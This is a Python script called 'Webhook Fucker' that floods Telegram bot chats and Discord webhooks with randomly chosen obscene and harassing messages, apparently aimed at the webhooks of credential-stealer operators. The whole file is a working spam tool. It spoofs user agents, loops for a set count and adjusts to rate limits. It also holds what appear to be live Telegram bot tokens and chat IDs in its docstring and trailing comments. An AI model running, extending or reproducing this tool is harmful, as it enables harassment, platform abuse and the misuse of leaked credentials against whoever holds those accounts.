#!/usr/bin/python3

'''

+-----------------------------------------+
|  PROJECT     : WEBHOOK FUCKER           |
|  DESCRIPTION : FLOOD TELEGRAM WEBHOOKS  |
|  RELEASE     : 6                        |
|  AUTHOR      : @F4C3R100                |
+-----------------------------------------+

'''

"""

Example For A Bot API :
-----------------------
1741739560:AAG9sn2fJ15pMgOqdR0Rt40NaZwh6BhjcCs


Example For A Chat ID : 
-----------------------
-557827205

"""


''' 	CHANGELOG	'''

"""
Version 1:
----------
- Added Timeless Loop Flood
- Added Single Message

Version 2:
----------
- Removed Timeless Loop Flood
- Added Local Tor Support
- Added Multiple Messages

Version 3:
----------
- Removed Local Tor Support
- Added More Messages

Version 4:
----------
- Added More Messages
- Added Fucker Name
- Added Sleep Interval

Version 5:
----------
- Added Headers To Send Reqest
- Added More Messages
- Added Telegram Channel Support(Advertise) -> tg Variable
- Added Exact Response(Invalid Chat, Group, Kicked From Group...)
- Fixed 'Successfully Sent' Response (Has printed success even on 4xx statuscodes)
- Fixed Bot API Problem
- Changed Version Text from v5 to V5

Version 6:
----------------
- Added Class 
- Added Discord
- Added User Block Exception
- Fixed Sleep At Unkown Error
- TODO : Adding proxy support

"""


import sys, os, requests, time, random, json, colorama
from user_agent import generate_user_agent

colorama.init()

msg=""
version = 6
banner="""
\033[31;1;3;5mWelcome to...\033[0;37;1m\n
██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝ 
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗ 
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝

       \033[34m[ \033[32mF \033[34m] \033[34m[ \033[32m4 \033[34m] \033[34m[ \033[32mC \033[34m] \033[34m[ \033[32m3 \033[34m] \033[34m[ \033[32mR \033[34m] \033[34m[ \033[32m1 \033[34m] \033[34m[ \033[32m0 \033[34m] \033[34m[ \033[32m0 \033[34m]
\033[31m                                                            
      ███████╗██╗   ██╗ ██████╗██╗  ██╗███████╗██████╗            
      ██╔════╝██║   ██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗           
      █████╗  ██║   ██║██║     █████╔╝ █████╗  ██████╔╝           
      ██╔══╝  ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗           
      ██║     ╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║           
      ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝           
                                                            

\033[34;1m[\033[33m1\033[34m] \033[31mTelegram Webhook Spammer
\033[34;1m[\033[33m2\033[34m] \033[31mDiscord Webhook Spammer
"""

class Webhook:
	def __init__(self, api, chat_id, fucker, tg):
		self.version = 6
		self.api = api
		self.chat_id = chat_id
		self.fucker = fucker
		self.tg = tg

	def random_message(self):
		if self.tg == None or self.tg == '':
			self.tg = "The Hell"
		messages = [f"😡 HITSTEALER AIN'T COOL 😡%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑", f"🛡 HELLO ME FROM INDIA 🛡%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑", f"🤖 RAPING BOT...PENIS! 🤖%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑", f"🕵️‍♂️ {generate_user_agent()}... mommy he is spoofing his useragent!!!🕵️‍♂️%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑", f"🚫 Uh-ah, don't steal hits bitch. 🚫%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑",f"💥 EXPOSED THE SNAKE 💥%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑",f"❌ SCAMMER CHAT FUCK OFF ❌%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑",f"👹 Join {self.tg} 👹%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑", f"😈 YOUR DADDY IS RAPING THA BOT 😈%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑", f"🖼 YOUR FACE GOT LEAKED 🖼%0A🔗 https://i.ibb.co/8bGTSs8/proof1.png 🔗%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑", f"🎲 YOUR LIFE IS A GAME AND NOW IT'S GAME OVER 🎲%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑", f"💋 FUCK YOUR GOAT MY SON 💋%0A🔱 WEBHOOK FUCKER V{self.version} 🔱%0A👑 @{self.fucker} (TELEGRAM) 👑"]
		return random.choice(messages)

	def discord(self):
		global msg
		msg = self.random_message()
		data = {"content": msg.replace("%0A", "\n")} 
		headers = {'User-Agent': generate_user_agent(),'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language': 'en-US,en;q=0.5','Connection': 'keep-alive','Upgrade-Insecure-Requests': '1','Pragma': 'no-cache','Cache-Control': 'no-cache','TE': 'Trailers'}
		r = requests.post(f"https://discord.com/api/webhooks/{self.chat_id}/{self.api}",headers=headers, data=data, timeout=5)

		if r.status_code == 401:
			if json.loads(r.content.decode()).get('message') == "Invalid Webhook Token":
				return 'TOKEN_ERROR'
			return 'UNKNOWN_ERROR'
		elif r.status_code == 404:
			if json.loads(r.content.decode()).get('message') == "Unknown Webhook":
				return 'UNKNOWN_WEBHOOK'
			return 'UNKNOWN_ERROR'
		elif r.status_code == 400:
			return 'ERROR'
		elif r.status_code == 429:
			if json.loads(r.content.decode()).get('message') == "You are being rate limited.":
				return 'LIMITED'
			return 'LIMITED'
		elif r.status_code == 204:
			return 'SUCCESS'
		else:
			return 'ERROR'

	def telegram(self):
		global msg
		msg = self.random_message()
		headers = {'User-Agent': generate_user_agent(),'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language': 'en-US,en;q=0.5','Connection': 'keep-alive','Upgrade-Insecure-Requests': '1','Pragma': 'no-cache','Cache-Control': 'no-cache','TE': 'Trailers'}
		if not 'bot' in self.api:
			self.api = 'bot'+str(self.api)
		r = requests.get(f"https://api.telegram.org/{self.api}/sendMessage?chat_id={self.chat_id}&text={msg}", headers=headers)
		if json.loads(r.content.decode()).get('description') == "Forbidden: bot was kicked from the supergroup chat" and r.status_code == 403:
			return 'KICKED'
		elif r.status_code == 400:
			if json.loads(r.content.decode()).get('description') == "Bad Request: chat not found":
				return 'INVALID_CHAT'
			elif json.loads(r.content.decode()).get('description') == "Bad Request: message text is empty":
				return 'TEXT_EMPTY'
			return 'ERROR'
		elif r.status_code == 401:
			if json.loads(r.content.decode()).get('description') == "Unauthorized":
				return 'UNAUTHORIZED'
			return 'ERROR'
		elif r.status_code == 403:
			if json.loads(r.content.decode()).get('description') == "Forbidden: bot can't initiate conversation with a user":
				return 'CHAT_DENIED'
			elif json.loads(r.content.decode()).get('description') == "Forbidden: bot was blocked by the user":
				return 'BOT_BLOCKED'
			return 'ERROR'
		elif r.status_code == 200:
			return 'SUCCESS'
		print(r.text)

def main():
	global msg
	print('\033c')
	print(banner)
	choose = int(input('\033[34;1m[\033[33m?\033[34m] Choose:\033[37m '))
	api = input("\n\033[34m[*] \033[32mEnter Bot API:\033[37m ")
	chat_id = input("\033[34m[*] \033[32mEnter Chat ID:\033[37m ")
	times = input("\033[34m[*] \033[32mEnter How Much:\033[37m ")
	fucker = input("\033[34m[*] \033[32mEnter Fucker Name:\033[37m ")
	tg = input("\033[34m[*] \033[32mIf you want add your Telegram / Youtube (if not leave empty):\033[37m ")
	x = 0
	fp = 1
	while x < int(times)+1:
		_ = Webhook(api, chat_id, fucker, tg)
		if choose == 1:
			try:
				send = _.telegram()
				if send == 'KICKED':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[31mBot was kicked from group \033[37m(\033[34m{chat_id}\033[37m)\033[0m")
					if fp:
						x += 1
				elif send == 'INVALID_CHAT':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[31mInvalid Telegram Chat \033[37m(\033[34m{chat_id}\033[37m) \033[0m")
					if fp:
						x += 1
				elif send == 'UNAUTHORIZED':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[31mUnauthorized \033[37m(\033[34m{chat_id}\033[37m) \033[0m")
					if fp:
						x += 1
				elif send == 'TEXT_EMPTY':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[31mInvalid Text \033[37m(\033[34m{msg}\033[37m) \033[0m")
					if fp:
						x += 1
				elif send == 'CHAT_DENIED':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[31mSending To Chat Not Allowed \033[37m(\033[34m{chat_id}\033[37m) \033[0m")
					if fp:
						x += 1
				elif send == 'BOT_BLOCKED':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[31mBot Was Blocked By User \033[37m(\033[34m{chat_id}\033[37m) \033[0m")
					s = input(f"\033[34m(\033[33m?\033[34m) \033[37mWant to quit? : ")
					if s.lower() == "y":
						sys.exit(0)
					if fp:
						x += 1
				elif send == 'SUCCESS':
					print(f"\033[34m(\033[32m{x}\033[34m/\033[32m{times}\033[34m) \033[32mSent successfully : \033[37m(\033[34m{msg}\033[37m)\033[0m")
					time.sleep(1)
					x += 1
				elif send == 'ERROR':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[32mUnknown Error, sleeping! \033[37m(\033[31mUNKNOWN_ERROR\033[37m)\033[0m")
					time.sleep(10)
			except Exception as e:
				time.sleep(5)
				#print(e)
				if fp:
					x += 1
				continue
		elif choose == 2:
			try:
				send = _.discord()
				if send == 'TOKEN_ERROR':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[31mInvalid Discord Token \033[37m(\033[34m{api}\033[37m)\033[0m")
					if fp:
						x += 1
				elif send == 'UNKNOWN_WEBHOOK':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[31mUnknown Discord Webhook \033[37m(\033[34m{chat_id}\033[37m)\033[0m")
					if fp:
						x += 1
				elif send == 'UNKNOWN_ERROR':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[32mUnknown Error \033[37m(\033[31mUNKNOWN_ERROR\033[37m)\033[0m")
					if fp:
						x += 1
				elif send == 'LIMITED':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[31mGot Limited : \033[37m(\033[34m{msg}\033[37m)\033[0m")
					time.sleep(3)
					if fp:
						x += 1
				elif send == 'SUCCESS':
					print(f"\033[34m(\033[32m{x}\033[34m/\033[32m{times}\033[34m) \033[32mSent successfully : \033[37m(\033[34m{msg}\033[37m)\033[0m")
					if fp:
						x += 1
				elif send == 'ERROR':
					print(f"\033[34m(\033[31m{x}\033[34m/\033[31m{times}\033[34m) \033[31mError \033[37m(\033[31mFORBIDDEN\033[37m)\033[0m")

			except Exception as e:
				#print(e)
				time.sleep(3)
				if fp:
					x += 1
				continue

if __name__ == '__main__':
	main()

#[*] Enter Bot API: 1886618900:AAFKBP9PG2pNyw2jJ6n4jbk4aI10VHf_Rlc
#[*] Enter Chat ID: 573680512
